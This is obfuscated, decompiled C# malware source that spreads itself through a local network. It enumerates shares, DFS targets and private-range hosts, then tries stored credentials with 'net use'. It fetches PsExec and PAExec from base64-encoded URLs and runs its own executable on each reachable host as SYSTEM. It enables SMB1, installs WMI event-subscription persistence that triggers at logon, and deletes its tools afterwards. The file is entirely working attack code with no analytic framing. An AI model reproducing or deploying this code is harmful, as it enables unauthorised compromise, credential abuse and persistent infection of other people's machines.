using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace YXHSMjloYIX;

internal class JqheCVtqczGpcld
{
	public class becMrJCDGkpQ
	{
		public string KaIWCbPJcMF { get; set; }
	}

	public enum WUJsTUOMRsIiORx
	{
		MRnGCcCHOQTtZJ = 1,
		VsYibmCTFCWKPzaYQ,
		hSIXAecUbBUU,
		NrkKsEyIyRHsW,
		RlTsdcglstIyx
	}

	public enum JaKONtLOftwU
	{
		hsgVmQmTHFcFQJ,
		DzNOlaVjyb,
		jIidNlewvNzRNY,
		xljwGrHhRtTryZ
	}

	public enum LPQEDuIhkGrL
	{
		HdVNUkxPQeSYiSZ = 1,
		EIoUJKihwTNNx = 2,
		OKiNaPeABbGWx = 4,
		HJTuIulVvZST = 8,
		BVAJotmcCfp = 16,
		KtQSiFQiKKqAfUa = 19
	}

	public enum hhJvDStkgjUpSeY
	{
		jjtGuIYbSymX,
		wyykYHykqFC,
		HXtABtngWyhAAz,
		itVbXBniwzPryig,
		mkiyzHryHTV,
		BKJiVVPeqhCT,
		qkAzmZDEftAPEGqe,
		UXdCNDAUFqXRTyD,
		kmnvORdRjZi,
		VdayJQIoyOkan,
		HLWAcoEifEI,
		GmmmqWhduIVy
	}

	public class HUIyhbpXGqpnPm : IEnumerable
	{
		private enum bccjdhaKSsvxf
		{
			KqcqrHXwhyOZVSJF = 0,
			RHLtfsOXxtGftX = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private class aWFGtsOGDIWFc
		{
			public WUJsTUOMRsIiORx RyhBTRNVxKGYo;

			public JaKONtLOftwU tLUNaJzAECofW;

			public hhJvDStkgjUpSeY WLEjjcpSWCX;

			public LPQEDuIhkGrL efKIQxWAzty;

			public string SbSYEEfnyEzE;

			public string JEHQTAieNMEMTSs;

			public string fsKsHXDyDwBaz;

			public string HNAUuwKyBHywe;
		}

		private ArrayList pBVgSjTBjw = new ArrayList();

		public int TNrEhOJhaVjYk => pBVgSjTBjw.Count;

		[DllImport("Mpr.dll")]
		private static extern bccjdhaKSsvxf WNetOpenEnumA(WUJsTUOMRsIiORx dwScope, JaKONtLOftwU dwType, LPQEDuIhkGrL dwUsage, aWFGtsOGDIWFc p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern bccjdhaKSsvxf WNetCloseEnum(IntPtr hEnum);

		[DllImport("Mpr.dll")]
		private static extern bccjdhaKSsvxf WNetEnumResourceA(IntPtr hEnum, ref uint lpcCount, IntPtr buffer, ref uint lpBufferSize);

		private void EnumerateServers(aWFGtsOGDIWFc pRsrc, WUJsTUOMRsIiORx scope, JaKONtLOftwU type, LPQEDuIhkGrL usage, hhJvDStkgjUpSeY displayType)
		{
			uint lpBufferSize = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint lpcCount = 1u;
			if (WNetOpenEnumA(scope, type, usage, pRsrc, out lphEnum) == bccjdhaKSsvxf.KqcqrHXwhyOZVSJF)
			{
				bccjdhaKSsvxf bccjdhaKSsvxf;
				do
				{
					bccjdhaKSsvxf = WNetEnumResourceA(lphEnum, ref lpcCount, intPtr, ref lpBufferSize);
					switch (bccjdhaKSsvxf)
					{
					case bccjdhaKSsvxf.RHLtfsOXxtGftX:
						continue;
					case bccjdhaKSsvxf.KqcqrHXwhyOZVSJF:
						Marshal.PtrToStructure(intPtr, pRsrc);
						if (pRsrc.WLEjjcpSWCX == displayType)
						{
							pBVgSjTBjw.Add(pRsrc.JEHQTAieNMEMTSs);
						}
						if ((pRsrc.efKIQxWAzty & LPQEDuIhkGrL.EIoUJKihwTNNx) == LPQEDuIhkGrL.EIoUJKihwTNNx)
						{
							EnumerateServers(pRsrc, scope, type, usage, displayType);
						}
						continue;
					}
					break;
				}
				while (bccjdhaKSsvxf != bccjdhaKSsvxf.RHLtfsOXxtGftX);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public HUIyhbpXGqpnPm(WUJsTUOMRsIiORx scope, JaKONtLOftwU type, LPQEDuIhkGrL usage, hhJvDStkgjUpSeY displayType)
		{
			aWFGtsOGDIWFc pRsrc = new aWFGtsOGDIWFc();
			EnumerateServers(pRsrc, scope, type, usage, displayType);
		}

		public IEnumerator GetEnumerator()
		{
			return pBVgSjTBjw.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct AacOFnfpysfDXcRRn
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string BeWxCtfkwhOz;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string RRGCTDEPjzniQ;

		public uint FijamyKPbXsFP;

		public uint SXHDQRfEYeALpW;

		public IntPtr svbXelwspic;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct IdFvJoRZnAeRGVJ
	{
		public int FijamyKPbXsFP;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string IOaYdqOtLYXvYJN;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string SOKEcyxZDKwT;
	}

	public struct rjZORUzdxh
	{
		public string wkzskdlqBiR;

		public string[] DtukmKJuJf;

		public rjZORUzdxh(string Name, string[] Target)
		{
			wkzskdlqBiR = Name;
			DtukmKJuJf = Target;
		}
	}

	[CompilerGenerated]
	private sealed class GejweaYUHGS
	{
		public string IxKtbxhmAF;

		public string FQpJjhVQryg;

		public void _003CRun_003Eb__1(string ip)
		{
			if ((!ip.StartsWith("10.") && !ip.StartsWith("172.") && !ip.StartsWith("192.168.") && !ip.Contains("")) || !xkywYvbuiZZpB(ip))
			{
				return;
			}
			try
			{
				if (zkwozuPRYYOVZ.SWmvUezVexv == "YES")
				{
					for (int i = 0; i < dRNyyFhmDXfPWU.Count; i++)
					{
						zkwozuPRYYOVZ.fsugkvmKpd("net.exe", "use \\\\" + ip + " /USER:" + dRNyyFhmDXfPWU[i] + " " + oFgFmEkqeESW[i]);
						Thread.Sleep(1000);
					}
				}
				else
				{
					zkwozuPRYYOVZ.fsugkvmKpd("net.exe", "use \\\\" + ip);
					Thread.Sleep(1000);
				}
			}
			catch
			{
			}
			if (zkwozuPRYYOVZ.SWmvUezVexv == "YES")
			{
				for (int j = 0; j < dRNyyFhmDXfPWU.Count; j++)
				{
					if (zkwozuPRYYOVZ.hlyaNOgFlxSwE)
					{
						if (File.Exists(IxKtbxhmAF))
						{
							zkwozuPRYYOVZ.fsugkvmKpd(IxKtbxhmAF, "\\\\" + ip + " -u \"" + dRNyyFhmDXfPWU[j] + "\" -p \"" + oFgFmEkqeESW[j] + "\" -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
						}
					}
					else if (File.Exists(FQpJjhVQryg))
					{
						zkwozuPRYYOVZ.fsugkvmKpd(FQpJjhVQryg, "\\\\" + ip + " -u \"" + dRNyyFhmDXfPWU[j] + "\" -p \"" + oFgFmEkqeESW[j] + "\" -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
					}
				}
			}
			else if (zkwozuPRYYOVZ.hlyaNOgFlxSwE)
			{
				if (File.Exists(IxKtbxhmAF))
				{
					zkwozuPRYYOVZ.fsugkvmKpd(IxKtbxhmAF, "\\\\" + ip + " -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
				}
			}
			else if (File.Exists(FQpJjhVQryg))
			{
				zkwozuPRYYOVZ.fsugkvmKpd(FQpJjhVQryg, "\\\\" + ip + " -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
			}
		}
	}

	[CompilerGenerated]
	private sealed class caEEWexkEjVdUUP
	{
		public string bWIyQlwxCnE;

		public bool _003CGetIPAddresses_003Eb__5(string o)
		{
			return o != bWIyQlwxCnE;
		}
	}

	private const int djPmRnoWeKXlU = 268435455;

	private const int COZoLvobMrLN = 0;

	public static List<string> wwbmMIjUODems = new List<string>();

	public static string EZzzSAZcLJyu = "";

	public static List<string> dRNyyFhmDXfPWU = new List<string>();

	public static List<string> oFgFmEkqeESW = new List<string>();

	public static List<string> DBKBlKcuyolyMy = new List<string>();

	public static List<becMrJCDGkpQ> lkESiZyOIdaSeg()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "/c net view";
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<becMrJCDGkpQ> list = new List<becMrJCDGkpQ>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == "There are no entries in the list.")
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new becMrJCDGkpQ
						{
							KaIWCbPJcMF = "\\" + stringBuilder.ToString() + "\\Users"
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string cWOxQkXRpzHSUllx, int jpBltpldPbzDR, int DdIdNwRbOEB, out IntPtr PBVumYmkDeYlcR, [MarshalAs(UnmanagedType.I4)] out int woMcbQXvxKMpZ, [MarshalAs(UnmanagedType.I4)] ref int CKmzXMjLHcyC);

	public static List<rjZORUzdxh> SiAFQYhHrQnc(string xbVoejfaTcOQa)
	{
		try
		{
			List<rjZORUzdxh> list = new List<rjZORUzdxh>();
			IntPtr PBVumYmkDeYlcR = default(IntPtr);
			int woMcbQXvxKMpZ = 0;
			int CKmzXMjLHcyC = 0;
			if (NetDfsEnum(xbVoejfaTcOQa, 3, 268435455, out PBVumYmkDeYlcR, out woMcbQXvxKMpZ, ref CKmzXMjLHcyC) == 0)
			{
				for (int i = 0; i < woMcbQXvxKMpZ; i++)
				{
					AacOFnfpysfDXcRRn aacOFnfpysfDXcRRn = (AacOFnfpysfDXcRRn)Marshal.PtrToStructure(PBVumYmkDeYlcR + i * Marshal.SizeOf(typeof(AacOFnfpysfDXcRRn)), typeof(AacOFnfpysfDXcRRn));
					if (aacOFnfpysfDXcRRn.BeWxCtfkwhOz == xbVoejfaTcOQa)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < aacOFnfpysfDXcRRn.SXHDQRfEYeALpW; j++)
					{
						IntPtr ptr = new IntPtr(aacOFnfpysfDXcRRn.svbXelwspic.ToInt64() + j * Marshal.SizeOf(typeof(IdFvJoRZnAeRGVJ)));
						IdFvJoRZnAeRGVJ idFvJoRZnAeRGVJ = (IdFvJoRZnAeRGVJ)Marshal.PtrToStructure(ptr, typeof(IdFvJoRZnAeRGVJ));
						if (idFvJoRZnAeRGVJ.FijamyKPbXsFP == 2)
						{
							list2.Add(Path.Combine(new string[3] { "\\\\", idFvJoRZnAeRGVJ.IOaYdqOtLYXvYJN, idFvJoRZnAeRGVJ.SOKEcyxZDKwT }));
						}
					}
					string text = aacOFnfpysfDXcRRn.BeWxCtfkwhOz.Replace(xbVoejfaTcOQa, "");
					if (text.StartsWith("\\"))
					{
						text = text.Substring(1);
					}
					list.Add(new rjZORUzdxh(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void cmkPZWQHfgkpAZXK()
	{
		zkwozuPRYYOVZ.zYZPgrtpuN("Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol");
		List<becMrJCDGkpQ> list = lkESiZyOIdaSeg();
		List<rjZORUzdxh> list2 = SiAFQYhHrQnc(Environment.MachineName);
		if (list2 != null)
		{
			foreach (rjZORUzdxh item in list2)
			{
				string[] dtukmKJuJf = item.DtukmKJuJf;
				foreach (string text in dtukmKJuJf)
				{
					if (text.Contains(Environment.MachineName))
					{
						continue;
					}
					try
					{
						if (zkwozuPRYYOVZ.SWmvUezVexv == "YES")
						{
							for (int j = 0; j < dRNyyFhmDXfPWU.Count; j++)
							{
								zkwozuPRYYOVZ.fsugkvmKpd("net.exe", "use " + text + " /USER:" + dRNyyFhmDXfPWU[j] + " " + oFgFmEkqeESW[j]);
							}
						}
						else
						{
							zkwozuPRYYOVZ.fsugkvmKpd("net.exe", "use " + text);
						}
						zkwozuPRYYOVZ.SrDtznAsnWUwPJK.Add(text.Replace("IPC$", ""));
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (becMrJCDGkpQ item2 in list)
		{
			if (item2.KaIWCbPJcMF.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (zkwozuPRYYOVZ.SWmvUezVexv == "YES")
				{
					for (int k = 0; k < dRNyyFhmDXfPWU.Count; k++)
					{
						zkwozuPRYYOVZ.fsugkvmKpd("net.exe", "use " + item2.KaIWCbPJcMF + " /USER:" + dRNyyFhmDXfPWU[k] + " " + oFgFmEkqeESW[k]);
					}
				}
				else
				{
					zkwozuPRYYOVZ.fsugkvmKpd("net.exe", "use " + item2.KaIWCbPJcMF);
				}
				zkwozuPRYYOVZ.SrDtznAsnWUwPJK.Add(item2.KaIWCbPJcMF.Replace("IPC$", ""));
			}
			catch
			{
			}
		}
	}

	public static void UsEsZVdJfis(string cQuvnPPPmfNHr, string UPOOVUDkAwgWXR, string JgHluhFOBwH)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Expected O, but got Unknown
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0098: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Unknown result type (might be due to invalid IL or missing references)
		//IL_0164: Expected O, but got Unknown
		//IL_015f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = "\\\\" + cQuvnPPPmfNHr + "\\root\\subscription";
			ConnectionOptions val = new ConnectionOptions();
			ManagementScope val2 = null;
			val2 = new ManagementScope(text, val);
			val2.get_Options().set_Username(UPOOVUDkAwgWXR);
			val2.get_Options().set_Password(JgHluhFOBwH);
			val2.get_Options().set_Authority(string.Format("ntlmdomain:{0}", "."));
			val2.get_Options().set_EnablePrivileges(true);
			val2.get_Options().set_Authentication((AuthenticationLevel)6);
			val2.get_Options().set_Impersonation((ImpersonationLevel)3);
			val2.Connect();
			ManagementClass val3 = new ManagementClass(val2, new ManagementPath("__EventFilter"), (ObjectGetOptions)null);
			string text2 = "SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'";
			WqlEventQuery val4 = new WqlEventQuery(text2);
			ManagementObject val5 = val3.CreateInstance();
			((ManagementBaseObject)val5).set_Item("Name", (object)"WorkerFilter");
			((ManagementBaseObject)val5).set_Item("Query", (object)((ManagementQuery)val4).get_QueryString());
			((ManagementBaseObject)val5).set_Item("QueryLanguage", (object)((ManagementQuery)val4).get_QueryLanguage());
			((ManagementBaseObject)val5).set_Item("EventNameSpace", (object)"root\\cimv2");
			val5.Put();
			ManagementObject val6 = new ManagementClass(val2, new ManagementPath("CommandLineEventConsumer"), (ObjectGetOptions)null).CreateInstance();
			((ManagementBaseObject)val6).set_Item("Name", (object)"EventConsumer");
			((ManagementBaseObject)val6).set_Item("ExecutablePath", (object)("\\\\" + cQuvnPPPmfNHr + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)));
			val6.Put();
			ManagementObject val7 = new ManagementClass(val2, new ManagementPath("__FilterToConsumerBinding"), (ObjectGetOptions)null).CreateInstance();
			((ManagementBaseObject)val7).set_Item("Filter", (object)val5.get_Path().get_RelativePath());
			((ManagementBaseObject)val7).set_Item("Consumer", (object)val6.get_Path().get_RelativePath());
			val7.Put();
		}
		catch (Exception)
		{
		}
	}

	public static void eDylwONwOPWyJGb()
	{
		List<zxxNGXjIfWO> list = zxxNGXjIfWO.tedLgTItSXSuTU();
		foreach (zxxNGXjIfWO item in list)
		{
			wwbmMIjUODems.Add(item.uHKHWDNtkfXGMfK);
		}
		string IxKtbxhmAF = "";
		string FQpJjhVQryg = "";
		try
		{
			IxKtbxhmAF = zKdffwzuXSHbv();
		}
		catch
		{
		}
		try
		{
			FQpJjhVQryg = fZLsXKwlFFZwbpodt();
		}
		catch
		{
		}
		foreach (zxxNGXjIfWO item2 in list)
		{
			try
			{
				if (item2.uHKHWDNtkfXGMfK.StartsWith("10.") || item2.uHKHWDNtkfXGMfK.StartsWith("172.") || item2.uHKHWDNtkfXGMfK.StartsWith("192.168.") || item2.uHKHWDNtkfXGMfK.Contains(""))
				{
					FppEWzVjmWxh.jnjjkGSILXWbE(item2.nGzCVjoAeo, item2.uHKHWDNtkfXGMfK, "255.255.255.0");
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(wwbmMIjUODems, delegate(string ip)
			{
				if ((ip.StartsWith("10.") || ip.StartsWith("172.") || ip.StartsWith("192.168.") || ip.Contains("")) && xkywYvbuiZZpB(ip))
				{
					try
					{
						if (zkwozuPRYYOVZ.SWmvUezVexv == "YES")
						{
							for (int i = 0; i < dRNyyFhmDXfPWU.Count; i++)
							{
								zkwozuPRYYOVZ.fsugkvmKpd("net.exe", "use \\\\" + ip + " /USER:" + dRNyyFhmDXfPWU[i] + " " + oFgFmEkqeESW[i]);
								Thread.Sleep(1000);
							}
						}
						else
						{
							zkwozuPRYYOVZ.fsugkvmKpd("net.exe", "use \\\\" + ip);
							Thread.Sleep(1000);
						}
					}
					catch
					{
					}
					if (zkwozuPRYYOVZ.SWmvUezVexv == "YES")
					{
						for (int j = 0; j < dRNyyFhmDXfPWU.Count; j++)
						{
							if (zkwozuPRYYOVZ.hlyaNOgFlxSwE)
							{
								if (File.Exists(IxKtbxhmAF))
								{
									zkwozuPRYYOVZ.fsugkvmKpd(IxKtbxhmAF, "\\\\" + ip + " -u \"" + dRNyyFhmDXfPWU[j] + "\" -p \"" + oFgFmEkqeESW[j] + "\" -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
								}
							}
							else if (File.Exists(FQpJjhVQryg))
							{
								zkwozuPRYYOVZ.fsugkvmKpd(FQpJjhVQryg, "\\\\" + ip + " -u \"" + dRNyyFhmDXfPWU[j] + "\" -p \"" + oFgFmEkqeESW[j] + "\" -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
							}
						}
					}
					else if (zkwozuPRYYOVZ.hlyaNOgFlxSwE)
					{
						if (File.Exists(IxKtbxhmAF))
						{
							zkwozuPRYYOVZ.fsugkvmKpd(IxKtbxhmAF, "\\\\" + ip + " -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
						}
					}
					else if (File.Exists(FQpJjhVQryg))
					{
						zkwozuPRYYOVZ.fsugkvmKpd(FQpJjhVQryg, "\\\\" + ip + " -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(IxKtbxhmAF))
			{
				File.Delete(IxKtbxhmAF);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(FQpJjhVQryg))
			{
				File.Delete(FQpJjhVQryg);
			}
		}
		catch (Exception)
		{
		}
	}

	public static List<string> louDDjmOQRI()
	{
		List<string> list = new List<string>();
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily.ToString() == "InterNetwork")
			{
				list.Add(iPAddress.ToString());
			}
		}
		return list;
	}

	public static string zKdffwzuXSHbv()
	{
		if (IntPtr.Size == 8)
		{
			return ysyasIswDnfqbTAg(new Uri(zkwozuPRYYOVZ.bxMeQFfPcma("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
		}
		return ysyasIswDnfqbTAg(new Uri(zkwozuPRYYOVZ.bxMeQFfPcma("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
	}

	public static string fZLsXKwlFFZwbpodt()
	{
		if (IntPtr.Size == 8)
		{
			return ysyasIswDnfqbTAg(new Uri(zkwozuPRYYOVZ.bxMeQFfPcma("aHR0cDovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWM2NC5leGU=")));
		}
		return ysyasIswDnfqbTAg(new Uri(zkwozuPRYYOVZ.bxMeQFfPcma("aHR0cDovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWMuZXhl")));
	}

	public static bool xkywYvbuiZZpB(string UexmPhuiUaf)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(UexmPhuiUaf);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string ysyasIswDnfqbTAg(Uri KCpRJTvKBHYf)
	{
		string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
		WebClient webClient = new WebClient();
		webClient.DownloadFile(KCpRJTvKBHYf, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	public static List<string> kJCGKUZEBGf()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration ");
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item("IpEnabled"))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item("IPAddress");
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			foreach (string bWIyQlwxCnE in array4)
			{
				if (bWIyQlwxCnE.Contains(":"))
				{
					array = array.Where((string o) => o != bWIyQlwxCnE).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}
}
